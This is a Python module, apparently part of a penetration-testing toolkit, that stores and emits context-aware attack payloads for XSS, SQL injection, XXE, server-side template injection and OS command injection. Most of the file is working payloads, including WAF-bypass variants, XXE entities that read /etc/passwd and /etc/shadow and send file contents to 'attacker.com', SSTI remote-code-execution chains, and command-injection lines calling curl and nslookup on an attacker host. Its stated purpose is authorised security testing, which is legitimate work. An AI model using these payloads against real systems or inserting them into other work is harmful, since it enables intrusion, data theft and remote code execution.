"""
Payload Generation Tools - Phase 2 Enhancement
===============================================

Context-aware payload generation for web application penetration testing.
Generates XSS, SQLi, XXE, SSTI, and command injection payloads based on 
detected technology stack, context, and WAF presence.

SECURITY NOTES:
- Payloads are generated locally - no external API calls
- All tools follow RBAC and audit logging
- Payloads are context-aware to maximize effectiveness
- No direct target interaction - payloads are for manual/automated testing
"""

import base64
import hashlib
import html
import logging
import re
import time
import urllib.parse
from typing import Any

from phantom.tools.registry import register_tool


logger = logging.getLogger(__name__)


# ============================================================================
# XSS Payload Database
# ============================================================================

_XSS_PAYLOADS: dict[str, list[dict[str, Any]]] = {
    # Basic payloads - no encoding
    "basic": [
        {"payload": "<script>alert(1)</script>", "context": "html", "bypasses": []},
        {"payload": "<img src=x onerror=alert(1)>", "context": "html", "bypasses": []},
        {"payload": "<svg onload=alert(1)>", "context": "html", "bypasses": []},
        {"payload": '"><script>alert(1)</script>', "context": "attribute", "bypasses": []},
        {"payload": "javascript:alert(1)", "context": "href", "bypasses": []},
        {"payload": "'-alert(1)-'", "context": "javascript", "bypasses": []},
        {"payload": "{{constructor.constructor('alert(1)')()}}", "context": "template", "bypasses": []},
    ],
    # Event handler payloads
    "event_handlers": [
        {"payload": "<body onload=alert(1)>", "context": "html", "bypasses": []},
        {"payload": "<input onfocus=alert(1) autofocus>", "context": "html", "bypasses": []},
        {"payload": "<marquee onstart=alert(1)>", "context": "html", "bypasses": []},
        {"payload": "<video><source onerror=alert(1)>", "context": "html", "bypasses": []},
        {"payload": "<details open ontoggle=alert(1)>", "context": "html", "bypasses": []},
        {"payload": "<audio src=x onerror=alert(1)>", "context": "html", "bypasses": []},
    ],
    # DOM-based XSS
    "dom_based": [
        {"payload": "#<img src=x onerror=alert(1)>", "context": "fragment", "bypasses": []},
        {"payload": "javascript:alert(document.domain)", "context": "href", "bypasses": []},
        {"payload": "data:text/html,<script>alert(1)</script>", "context": "href", "bypasses": []},
    ],
    # Encoded payloads for WAF bypass
    "encoded": [
        {"payload": "<scr<script>ipt>alert(1)</scr</script>ipt>", "context": "html", "bypasses": ["basic_filter"]},
        {"payload": "<ScRiPt>alert(1)</ScRiPt>", "context": "html", "bypasses": ["case_sensitive"]},
        {"payload": "<img src=x onerror=\\u0061lert(1)>", "context": "html", "bypasses": ["keyword_filter"]},
        {"payload": "<img src=x onerror=al\\u0065rt(1)>", "context": "html", "bypasses": ["keyword_filter"]},
        {"payload": "<%00script>alert(1)</script>", "context": "html", "bypasses": ["null_byte"]},
        {"payload": "<svg/onload=alert(1)>", "context": "html", "bypasses": ["whitespace"]},
        {"payload": "<svg\tonload=alert(1)>", "context": "html", "bypasses": ["whitespace"]},
        {"payload": "<svg\nonload=alert(1)>", "context": "html", "bypasses": ["whitespace"]},
    ],
    # Polyglot payloads
    "polyglot": [
        {
            "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "context": "multi",
            "bypasses": ["multi_context"],
        },
        {
            "payload": "'\"-->]]>*/</script></style></textarea></title><svg onload=alert(1)>",
            "context": "multi",
            "bypasses": ["context_escape"],
        },
    ],
}


# ============================================================================
# SQLi Payload Database
# ============================================================================

_SQLI_PAYLOADS: dict[str, list[dict[str, Any]]] = {
    # Detection payloads
    "detection": [
        {"payload": "'", "db": "all", "type": "error_based"},
        {"payload": "\"", "db": "all", "type": "error_based"},
        {"payload": "' OR '1'='1", "db": "all", "type": "boolean"},
        {"payload": "' OR '1'='1' --", "db": "mysql", "type": "boolean"},
        {"payload": "' OR '1'='1' -- -", "db": "mysql", "type": "boolean"},
        {"payload": "1 OR 1=1", "db": "all", "type": "boolean"},
        {"payload": "' OR 1=1#", "db": "mysql", "type": "boolean"},
        {"payload": "') OR ('1'='1", "db": "all", "type": "boolean"},
        {"payload": "1' AND '1'='1", "db": "all", "type": "boolean"},
        {"payload": "1' AND '1'='2", "db": "all", "type": "boolean"},
    ],
    # Union-based
    "union": [
        {"payload": "' UNION SELECT NULL--", "db": "all", "type": "union"},
        {"payload": "' UNION SELECT NULL,NULL--", "db": "all", "type": "union"},
        {"payload": "' UNION SELECT NULL,NULL,NULL--", "db": "all", "type": "union"},
        {"payload": "1 UNION SELECT 1,2,3--", "db": "all", "type": "union"},
        {"payload": "-1 UNION SELECT 1,2,3--", "db": "all", "type": "union"},
        {"payload": "' UNION ALL SELECT NULL--", "db": "all", "type": "union"},
    ],
    # Time-based blind
    "time_blind": [
        {"payload": "' AND SLEEP(5)--", "db": "mysql", "type": "time_based"},
        {"payload": "'; WAITFOR DELAY '0:0:5'--", "db": "mssql", "type": "time_based"},
        {"payload": "' AND pg_sleep(5)--", "db": "postgresql", "type": "time_based"},
        {"payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "db": "mysql", "type": "time_based"},
    ],
    # Error-based extraction
    "error_based": [
        {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--", "db": "mysql", "type": "error_based"},
        {"payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--", "db": "mysql", "type": "error_based"},
        {"payload": "' AND 1=CONVERT(int,(SELECT @@version))--", "db": "mssql", "type": "error_based"},
    ],
    # Stacked queries
    "stacked": [
        {"payload": "'; SELECT SLEEP(5);--", "db": "mysql", "type": "stacked"},
        {"payload": "'; SELECT pg_sleep(5);--", "db": "postgresql", "type": "stacked"},
        {"payload": "'; WAITFOR DELAY '0:0:5';--", "db": "mssql", "type": "stacked"},
    ],
    # WAF bypass variations
    "waf_bypass": [
        {"payload": "'/**/OR/**/1=1--", "db": "all", "type": "bypass", "bypasses": ["space_filter"]},
        {"payload": "'%09OR%091=1--", "db": "all", "type": "bypass", "bypasses": ["space_filter"]},
        {"payload": "' oR 1=1--", "db": "all", "type": "bypass", "bypasses": ["case_filter"]},
        {"payload": "' /*!50000OR*/ 1=1--", "db": "mysql", "type": "bypass", "bypasses": ["mysql_comment"]},
        {"payload": "' UN/**/ION SEL/**/ECT 1,2,3--", "db": "all", "type": "bypass", "bypasses": ["keyword_filter"]},
        {"payload": "' %55NION %53ELECT 1,2,3--", "db": "all", "type": "bypass", "bypasses": ["url_encode"]},
    ],
}


# ============================================================================
# XXE Payload Database
# ============================================================================

_XXE_PAYLOADS: dict[str, list[dict[str, Any]]] = {
    # File disclosure
    "file_disclosure": [
        {
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            "type": "file",
            "os": "linux",
        },
        {
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            "type": "file",
            "os": "windows",
        },
        {
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
            "type": "file",
            "os": "linux",
        },
    ],
    # SSRF via XXE
    "ssrf": [
        {
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]><foo>&xxe;</foo>',
            "type": "ssrf",
        },
        {
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            "type": "ssrf_aws",
        },
    ],
    # Blind XXE with external DTD
    "blind_exfil": [
        {
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>',
            "type": "blind",
            "note": "Requires external DTD hosted on attacker server",
        },
    ],
    # Parameter entity XXE
    "parameter_entity": [
        {
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?data=%file;\'>">%eval;%exfil;]><foo>test</foo>',
            "type": "param_entity",
        },
    ],
    # XInclude
    "xinclude": [
        {
            "payload": '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
            "type": "xinclude",
        },
    ],
}


# ============================================================================
# SSTI Payload Database
# ============================================================================

_SSTI_PAYLOADS: dict[str, list[dict[str, Any]]] = {
    # Detection payloads
    "detection": [
        {"payload": "{{7*7}}", "engine": "jinja2/twig", "expected": "49"},
        {"payload": "${7*7}", "engine": "freemarker/velocity", "expected": "49"},
        {"payload": "#{7*7}", "engine": "thymeleaf", "expected": "49"},
        {"payload": "<%= 7*7 %>", "engine": "erb", "expected": "49"},
        {"payload": "{{7*'7'}}", "engine": "jinja2", "expected": "7777777"},
        {"payload": "{php}echo 7*7;{/php}", "engine": "smarty", "expected": "49"},
        {"payload": "@(1+1)", "engine": "razor", "expected": "2"},
    ],
    # Jinja2 RCE
    "jinja2": [
        {
            "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "engine": "jinja2",
            "type": "rce",
        },
        {
            "payload": "{{''.__class__.__mro__[1].__subclasses__()}}",
            "engine": "jinja2",
            "type": "class_enum",
        },
        {
            "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "engine": "jinja2_flask",
            "type": "rce",
        },
    ],
    # Twig
    "twig": [
        {
            "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "engine": "twig",
            "type": "rce",
        },
    ],
    # Freemarker
    "freemarker": [
        {
            "payload": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            "engine": "freemarker",
            "type": "rce",
        },
    ],
    # Velocity
    "velocity": [
        {
            "payload": '#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end',
            "engine": "velocity",
            "type": "rce",
        },
    ],
}


# ============================================================================
# Command Injection Payload Database
# ============================================================================

_CMD_INJECTION_PAYLOADS: dict[str, list[dict[str, Any]]] = {
    # Basic command chaining
    "chaining": [
        {"payload": ";id", "os": "linux", "type": "semicolon"},
        {"payload": "|id", "os": "linux", "type": "pipe"},
        {"payload": "||id", "os": "linux", "type": "or"},
        {"payload": "&&id", "os": "linux", "type": "and"},
        {"payload": "`id`", "os": "linux", "type": "backtick"},
        {"payload": "$(id)", "os": "linux", "type": "subshell"},
        {"payload": "&whoami", "os": "windows", "type": "ampersand"},
        {"payload": "|whoami", "os": "windows", "type": "pipe"},
        {"payload": "||whoami", "os": "windows", "type": "or"},
        {"payload": "&&whoami", "os": "windows", "type": "and"},
    ],
    # Time-based blind
    "time_based": [
        {"payload": ";sleep 5", "os": "linux", "type": "time_blind"},
        {"payload": "|sleep 5", "os": "linux", "type": "time_blind"},
        {"payload": "$(sleep 5)", "os": "linux", "type": "time_blind"},
        {"payload": "`sleep 5`", "os": "linux", "type": "time_blind"},
        {"payload": "&ping -n 5 127.0.0.1", "os": "windows", "type": "time_blind"},
        {"payload": "|ping -n 5 127.0.0.1", "os": "windows", "type": "time_blind"},
    ],
    # DNS-based out-of-band
    "oob": [
        {"payload": ";nslookup attacker.com", "os": "linux", "type": "oob_dns"},
        {"payload": "$(nslookup attacker.com)", "os": "linux", "type": "oob_dns"},
        {"payload": ";curl http://attacker.com/", "os": "linux", "type": "oob_http"},
        {"payload": "$(curl http://attacker.com/)", "os": "linux", "type": "oob_http"},
        {"payload": "&nslookup attacker.com", "os": "windows", "type": "oob_dns"},
    ],
    # Bypass techniques
    "bypass": [
        {"payload": ";i]d", "os": "linux", "type": "bypass", "bypasses": ["bracket"]},
        {"payload": ";i'd'", "os": "linux", "type": "bypass", "bypasses": ["quote"]},
        {"payload": ";i$()d", "os": "linux", "type": "bypass", "bypasses": ["empty_var"]},
        {"payload": ";/???/??t /???/p]s]w]", "os": "linux", "type": "bypass", "bypasses": ["glob"]},
        {"payload": "${IFS}id", "os": "linux", "type": "bypass", "bypasses": ["space_filter"]},
        {"payload": ";id%0a", "os": "linux", "type": "bypass", "bypasses": ["newline"]},
    ],
}


# ============================================================================
# Payload Generation Functions
# ============================================================================


@register_tool(sandbox_execution=False)
async def generate_xss_payloads(
    context: str = "html",
    waf_type: str | None = None,
    encoding: str | None = None,
    max_payloads: int = 20,
) -> dict[str, Any]:
    """
    Generate context-aware XSS payloads for web application testing.
    
    Generates payloads optimized for specific injection contexts and
    optional WAF bypass techniques.
    
    Args:
        context: Injection context - "html", "attribute", "javascript", 
                 "href", "template", "multi" (default: "html")
        waf_type: WAF to bypass - "cloudflare", "akamai", "modsecurity", 
                  "imperva", "f5", etc. (optional)
        encoding: Output encoding - "url", "html", "base64", "unicode" (optional)
        max_payloads: Maximum number of payloads to return (default: 20)
    
    Returns:
        Dict with 'payloads' list and metadata
    """
    payloads: list[dict[str, Any]] = []
    
    # Collect relevant payloads based on context
    for category, category_payloads in _XSS_PAYLOADS.items():
        for p in category_payloads:
            # Filter by context if specified
            if context != "all" and p.get("context") not in [context, "multi"]:
                continue
            
            payload_data = {
                "payload": p["payload"],
                "category": category,
                "context": p.get("context", "html"),
                "bypasses": p.get("bypasses", []),
            }
            payloads.append(payload_data)
    
    # Add WAF-specific bypass payloads
    if waf_type:
        waf_payloads = _generate_waf_xss_bypasses(waf_type)
        payloads.extend(waf_payloads)
    
    # Apply encoding if requested
    if encoding:
        for p in payloads:
            p["encoded"] = _encode_payload(p["payload"], encoding)
    
    # Limit results
    payloads = payloads[:max_payloads]
    
    return {
        "success": True,
        "payloads": payloads,
        "total_count": len(payloads),
        "context": context,
        "waf_bypass": waf_type,
        "encoding": encoding,
        "usage": "Test each payload in the target context. Monitor for script execution.",
    }


@register_tool(sandbox_execution=False)
async def generate_sqli_payloads(
    db_type: str = "all",
    injection_type: str = "all",
    waf_type: str | None = None,
    column_count: int | None = None,
    max_payloads: int = 25,
) -> dict[str, Any]:
    """
    Generate context-aware SQL injection payloads.
    
    Generates payloads for different database backends and injection types.
    
    Args:
        db_type: Target database - "mysql", "postgresql", "mssql", "oracle", "all"
        injection_type: Type of injection - "detection", "union", "time_blind",
                       "error_based", "stacked", "boolean", "all"
        waf_type: WAF to bypass (optional)
        column_count: Number of columns for UNION payloads (optional)
        max_payloads: Maximum payloads to return (default: 25)
    
    Returns:
        Dict with 'payloads' list and metadata
    """
    payloads: list[dict[str, Any]] = []
    
    # Collect relevant payloads
    for category, category_payloads in _SQLI_PAYLOADS.items():
        # Filter by injection type
        if injection_type != "all" and category != injection_type:
            if category != "waf_bypass":  # Always include bypass payloads if WAF specified
                continue
        
        for p in category_payloads:
            # Filter by database type
            if db_type != "all" and p.get("db") not in [db_type, "all"]:
                continue
            
            payload_data = {
                "payload": p["payload"],
                "category": category,
                "db": p.get("db", "all"),
                "type": p.get("type", "unknown"),
                "bypasses": p.get("bypasses", []),
            }
            payloads.append(payload_data)
    
    # Generate UNION payloads with specific column count
    if column_count and column_count > 0:
        union_payloads = _generate_union_payloads(column_count, db_type)
        payloads.extend(union_payloads)
    
    # Add WAF bypass variations
    if waf_type:
        waf_payloads = _generate_waf_sqli_bypasses(waf_type, db_type)
        payloads.extend(waf_payloads)
    
    # Limit results
    payloads = payloads[:max_payloads]
    
    return {
        "success": True,
        "payloads": payloads,
        "total_count": len(payloads),
        "db_type": db_type,
        "injection_type": injection_type,
        "waf_bypass": waf_type,
        "usage": "Test payloads in injection points. Monitor for errors, timing, or data extraction.",
    }


@register_tool(sandbox_execution=False)
async def generate_xxe_payloads(
    target_os: str = "linux",
    xxe_type: str = "all",
    target_file: str | None = None,
    callback_url: str | None = None,
    max_payloads: int = 15,
) -> dict[str, Any]:
    """
    Generate XXE (XML External Entity) injection payloads.
    
    Creates payloads for file disclosure, SSRF, and blind XXE attacks.
    
    Args:
        target_os: Target OS - "linux", "windows", "all"
        xxe_type: Type of XXE - "file_disclosure", "ssrf", "blind_exfil", 
                  "parameter_entity", "xinclude", "all"
        target_file: Specific file to read (optional, e.g., "/etc/passwd")
        callback_url: Attacker callback URL for blind XXE (optional)
        max_payloads: Maximum payloads to return (default: 15)
    
    Returns:
        Dict with 'payloads' list and metadata
    """
    payloads: list[dict[str, Any]] = []
    
    # Collect relevant payloads
    for category, category_payloads in _XXE_PAYLOADS.items():
        if xxe_type != "all" and category != xxe_type:
            continue
        
        for p in category_payloads:
            # Filter by OS
            if target_os != "all" and p.get("os") and p["os"] != target_os:
                continue
            
            payload = p["payload"]
            
            # Customize with target file
            if target_file:
                payload = payload.replace("file:///etc/passwd", f"file://{target_file}")
                payload = payload.replace("file:///c:/windows/win.ini", f"file://{target_file}")
            
            # Customize with callback URL
            if callback_url:
                payload = payload.replace("http://attacker.com", callback_url)
                payload = payload.replace("http://internal-server/", callback_url)
            
            payload_data = {
                "payload": payload,
                "category": category,
                "type": p.get("type", "unknown"),
                "os": p.get("os", "all"),
                "note": p.get("note", ""),
            }
            payloads.append(payload_data)
    
    # Generate custom file reading payloads
    if target_file:
        custom_payloads = _generate_custom_xxe_payloads(target_file, target_os)
        payloads.extend(custom_payloads)
    
    # Limit results
    payloads = payloads[:max_payloads]
    
    return {
        "success": True,
        "payloads": payloads,
        "total_count": len(payloads),
        "target_os": target_os,
        "xxe_type": xxe_type,
        "target_file": target_file,
        "callback_url": callback_url,
        "usage": "Submit payloads to XML processing endpoints. Check for file contents or callbacks.",
    }


@register_tool(sandbox_execution=False)
async def generate_ssti_payloads(
    template_engine: str = "all",
    payload_type: str = "all",
    command: str | None = None,
    max_payloads: int = 20,
) -> dict[str, Any]:
    """
    Generate SSTI (Server-Side Template Injection) payloads.
    
    Creates payloads for various template engines including Jinja2, Twig,
    Freemarker, Velocity, and more.
    
    Args:
        template_engine: Target engine - "jinja2", "twig", "freemarker", 
                        "velocity", "erb", "smarty", "thymeleaf", "all"
        payload_type: Type - "detection", "rce", "class_enum", "all"
        command: Custom command to execute (optional, default: "id")
        max_payloads: Maximum payloads to return (default: 20)
    
    Returns:
        Dict with 'payloads' list and metadata
    """
    payloads: list[dict[str, Any]] = []
    
    # Collect relevant payloads
    for category, category_payloads in _SSTI_PAYLOADS.items():
        for p in category_payloads:
            # Filter by template engine
            engine = p.get("engine", "")
            if template_engine != "all":
                if template_engine not in engine and engine not in template_engine:
                    continue
            
            # Filter by payload type
            p_type = p.get("type", "detection")
            if payload_type != "all" and p_type != payload_type:
                continue
            
            payload = p["payload"]
            
            # Customize command if specified
            if command:
                payload = payload.replace("'id'", f"'{command}'")
                payload = payload.replace('"id"', f'"{command}"')
                payload = payload.replace("('id')", f"('{command}')")
            
            payload_data = {
                "payload": payload,
                "category": category,
                "engine": engine,
                "type": p_type,
                "expected": p.get("expected", ""),
            }
            payloads.append(payload_data)
    
    # Limit results
    payloads = payloads[:max_payloads]
    
    return {
        "success": True,
        "payloads": payloads,
        "total_count": len(payloads),
        "template_engine": template_engine,
        "payload_type": payload_type,
        "custom_command": command,
        "usage": "Test detection payloads first to confirm SSTI, then escalate to RCE.",
        "detection_tips": [
            "Look for mathematical expressions being evaluated (49 instead of {{7*7}})",
            "Try different syntax for different engines",
            "Check error messages for template engine hints",
        ],
    }


@register_tool(sandbox_execution=False)
async def generate_cmd_injection_payloads(
    target_os: str = "linux",
    injection_type: str = "all",
    command: str | None = None,
    callback_url: str | None = None,
    max_payloads: int = 25,
) -> dict[str, Any]:
    """
    Generate OS command injection payloads.
    
    Creates payloads for command chaining, time-based blind injection,
    and out-of-band exfiltration.
    
    Args:
        target_os: Target OS - "linux", "windows", "all"
        injection_type: Type - "chaining", "time_based", "oob", "bypass", "all"
        command: Custom command to execute (optional)
        callback_url: Attacker callback URL for OOB (optional)
        max_payloads: Maximum payloads to return (default: 25)
    
    Returns:
        Dict with 'payloads' list and metadata
    """
    payloads: list[dict[str, Any]] = []
    
    # Collect relevant payloads
    for category, category_payloads in _CMD_INJECTION_PAYLOADS.items():
        if injection_type != "all" and category != injection_type:
            continue
        
        for p in category_payloads:
            # Filter by OS
            if target_os != "all" and p.get("os") != target_os:
                continue
            
            payload = p["payload"]
            
            # Customize command
            if command:
                # Replace default commands
                for default_cmd in ["id", "whoami", "sleep 5", "ping -n 5 127.0.0.1"]:
                    if default_cmd in payload:
                        payload = payload.replace(default_cmd, command)
                        break
            
            # Customize callback URL
            if callback_url:
                payload = payload.replace("attacker.com", callback_url.replace("http://", "").replace("https://", "").split("/")[0])
            
            payload_data = {
                "payload": payload,
                "category": category,
                "os": p.get("os", "all"),
                "type": p.get("type", "unknown"),
                "bypasses": p.get("bypasses", []),
            }
            payloads.append(payload_data)
    
    # Limit results
    payloads = payloads[:max_payloads]
    
    return {
        "success": True,
        "payloads": payloads,
        "total_count": len(payloads),
        "target_os": target_os,
        "injection_type": injection_type,
        "custom_command": command,
        "callback_url": callback_url,
        "usage": "Test payloads in command injection points. Monitor for output, timing, or callbacks.",
        "tips": [
            "Start with time-based payloads for blind detection",
            "Use OOB payloads when no direct output is visible",
            "Try multiple chaining operators (;, |, &&, ||)",
        ],
    }


# ============================================================================
# Helper Functions
# ============================================================================


def _encode_payload(payload: str, encoding: str) -> str:
    """Encode payload with specified encoding."""
    if encoding == "url":
        return urllib.parse.quote(payload)
    elif encoding == "html":
        return html.escape(payload)
    elif encoding == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif encoding == "unicode":
        return "".join(f"\\u{ord(c):04x}" for c in payload)
    return payload


def _generate_waf_xss_bypasses(waf_type: str) -> list[dict[str, Any]]:
    """Generate WAF-specific XSS bypass payloads."""
    bypasses: list[dict[str, Any]] = []
    
    waf_techniques: dict[str, list[str]] = {
        "cloudflare": [
            "<a href=javas&#99;ript:alert(1)>click",
            "<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>",
            "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>",
        ],
        "akamai": [
            "<img src=1 onerror\\x00=alert(1)>",
            "<svg><script>alert&#40;1&#41;</script>",
        ],
        "modsecurity": [
            "<svg/onload=prompt(1)>",
            "<object data=javascript:alert(1)>",
            "<math><maction actiontype=statusline#http://google.com xlink:href=javascript:alert(1)>click",
        ],
        "imperva": [
            "<svg onload=top[`al`+`ert`](1)>",
            "<img src=x onerror=window['alert'](1)>",
        ],
        "f5": [
            "<img src=x onerror=this['\\x61lert'](1)>",
            "<svg onload=self['ale'+'rt'](1)>",
        ],
    }
    
    for payload in waf_techniques.get(waf_type.lower(), []):
        bypasses.append({
            "payload": payload,
            "category": "waf_bypass",
            "context": "html",
            "bypasses": [waf_type.lower()],
        })
    
    return bypasses


def _generate_waf_sqli_bypasses(waf_type: str, db_type: str) -> list[dict[str, Any]]:
    """Generate WAF-specific SQLi bypass payloads."""
    bypasses: list[dict[str, Any]] = []
    
    waf_techniques: dict[str, list[str]] = {
        "cloudflare": [
            "' /*!50000OR*/ 1=1--",
            "' %0AOR%0A 1=1--",
            "'+/*!0AND*/+1=1--",
        ],
        "akamai": [
            "'-1'='- 1'--",
            "' || 1=1--",
            "'\t\nOR\t\n1=1--",
        ],
        "modsecurity": [
            "' /*!OR*/ 1=1#",
            "' && 1=1--",
            "1' /*!50000ORDER BY*/ 1--",
        ],
    }
    
    for payload in waf_techniques.get(waf_type.lower(), []):
        bypasses.append({
            "payload": payload,
            "category": "waf_bypass",
            "db": db_type if db_type != "all" else "all",
            "type": "bypass",
            "bypasses": [waf_type.lower()],
        })
    
    return bypasses


def _generate_union_payloads(column_count: int, db_type: str) -> list[dict[str, Any]]:
    """Generate UNION payloads with specific column count."""
    payloads: list[dict[str, Any]] = []
    
    # NULL-based UNION
    nulls = ",".join(["NULL"] * column_count)
    payloads.append({
        "payload": f"' UNION SELECT {nulls}--",
        "category": "union_custom",
        "db": db_type,
        "type": "union",
        "columns": column_count,
    })
    
    # Number-based UNION
    nums = ",".join(str(i) for i in range(1, column_count + 1))
    payloads.append({
        "payload": f"-1 UNION SELECT {nums}--",
        "category": "union_custom",
        "db": db_type,
        "type": "union",
        "columns": column_count,
    })
    
    # String-based (for finding output columns)
    strings = ",".join([f"'col{i}'" for i in range(1, column_count + 1)])
    payloads.append({
        "payload": f"-1 UNION SELECT {strings}--",
        "category": "union_custom",
        "db": db_type,
        "type": "union",
        "columns": column_count,
    })
    
    return payloads


def _generate_custom_xxe_payloads(target_file: str, target_os: str) -> list[dict[str, Any]]:
    """Generate XXE payloads for specific file."""
    payloads: list[dict[str, Any]] = []
    
    # Standard file entity
    payloads.append({
        "payload": f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{target_file}">]><foo>&xxe;</foo>',
        "category": "custom",
        "type": "file",
        "os": target_os,
        "note": f"Read {target_file}",
    })
    
    # PHP filter for base64 encoding (useful for binary/PHP files)
    if target_os == "linux":
        encoded_file = base64.b64encode(target_file.encode()).decode()
        payloads.append({
            "payload": f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={target_file}">]><foo>&xxe;</foo>',
            "category": "custom",
            "type": "file_php",
            "os": "linux",
            "note": f"Read {target_file} with base64 encoding (PHP apps)",
        })
    
    return payloads
